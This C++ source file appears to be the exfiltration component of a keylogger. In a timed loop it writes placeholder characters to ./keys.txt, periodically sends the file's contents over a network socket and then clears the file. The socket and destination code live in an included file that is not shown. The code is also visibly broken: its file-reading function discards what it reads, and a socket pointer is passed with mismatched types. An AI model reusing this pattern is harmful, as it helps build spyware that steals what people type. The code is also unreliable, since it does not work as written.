#include "file_send.cpp"
#include <iostream>
#include <stdio.h>
#include <string>
#include <thread>
#include <stdlib.h>
#include "timer.cpp"

extern int counter;
extern std::mutex mtx;
extern bool ready;

ofstream out;

string read_file(string filename) {
    ifstream f;

    string text;

    f.open(filename);

    if (f.is_open()) {
        while (getline(f, text)) {
            
        }

        f.close();
    }

    return text;
}

int main() {
	std::thread th(tick);

    string buffer = "";
    string filename = "./keys.txt";

    while (true){
        if(ready && mtx.try_lock()) {
            if (counter % 10 == 0){
                
                string text = read_file(filename);

                SOCKET * result_socket;

                send_file(&result_socket);

                if (result_socket){
                    int send_result = send(*result_socket, text.c_str(), strlen(text.c_str()), 0);

                    cout << WSAGetLastError() << endl;

                    closesocket(*result_socket);
                }

                fclose(fopen(filename.c_str(), "w"));

                cout << buffer << endl;
                buffer = "";
            }

            else if (counter % 5 == 0){
                buffer += 'a';

                out.open(filename, std::ios_base::app);
                out << buffer;
                out.close();
            }

            ready = false;

            mtx.unlock();
        }
    }

	return 0;
}